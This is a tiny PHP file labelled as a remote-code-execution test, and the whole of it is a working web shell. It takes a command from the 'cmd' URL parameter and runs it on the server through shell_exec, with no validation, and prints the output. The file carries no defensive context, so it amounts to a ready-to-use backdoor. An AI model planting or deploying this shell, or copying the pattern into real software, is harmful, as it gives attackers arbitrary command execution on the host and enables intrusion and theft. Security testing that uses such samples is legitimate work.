<?php
// RCE test variation #25
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>